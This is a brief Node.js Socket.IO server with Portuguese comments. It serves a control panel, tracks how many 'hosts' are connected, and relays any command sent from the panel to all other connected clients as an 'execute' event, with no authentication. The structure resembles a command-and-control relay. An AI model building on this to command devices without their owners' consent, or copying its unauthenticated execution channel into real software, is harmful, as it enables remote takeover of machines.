const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Serve o painel HTML
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

let clientCount = 0;

io.on('connection', (socket) => {
    clientCount++;
    console.log('Novo dispositivo conectado:', socket.id, '| Total:', clientCount);
    
    // Avisa o painel quantos hosts tem
    io.emit('host-count', clientCount);

    socket.on('send-command', (data) => {
        console.log('Comando recebido do painel:', data);
        socket.broadcast.emit('execute', data);
    });

    socket.on('disconnect', () => {
        clientCount--;
        console.log('Dispositivo desconectado | Total:', clientCount);
        io.emit('host-count', clientCount);
    });
});
